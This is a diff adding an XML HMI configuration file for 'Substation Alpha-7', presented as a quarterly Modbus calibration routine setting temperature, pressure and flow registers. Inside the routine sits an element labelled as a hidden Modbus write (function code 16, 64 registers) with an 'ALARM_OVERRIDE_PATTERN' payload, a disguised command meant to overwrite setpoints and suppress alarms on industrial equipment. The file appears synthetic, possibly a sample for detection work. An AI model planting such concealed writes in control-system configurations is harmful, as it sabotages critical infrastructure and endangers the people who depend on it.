@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<HMIConfiguration>
+  <version>3.2.1</version>
+  <manufacturer>Vortex Industries</manufacturer>
+  <station_id>0x4A2E</station_id>
+  <substation_name>Substation Alpha-7</substation_name>
+  <CalibrationRoutine>
+    <name>Q3_Equipment_Calibration</name>
+    <ManifestSeed>137</ManifestSeed>
+    <description>Quarterly calibration for Modbus RTU devices</description>
+    <TargetDevice ip="192.168.50.10" port="502" protocol="Modbus/TCP"/>
+    <Registers>
+      <Register address="40001" value="100" type="holding">Temperature Setpoint</Register>
+      <Register address="40002" value="200" type="holding">Pressure Setpoint</Register>
+      <Register address="40003" value="300" type="holding">Flow Rate Limit</Register>
+    </Registers>
+    <!-- Hidden Modbus write command embedded in calibration routine -->
+    <HiddenModbusWrite function_code="16" start_address="40001" count="64">
+      <Payload type="ALARM_OVERRIDE_PATTERN">55 FA 55 FA 55 FA 55 FA 55 FA 55 FA 55 FA 55 FA</Payload>
+    </HiddenModbusWrite>
+  </CalibrationRoutine>
+</HMIConfiguration>
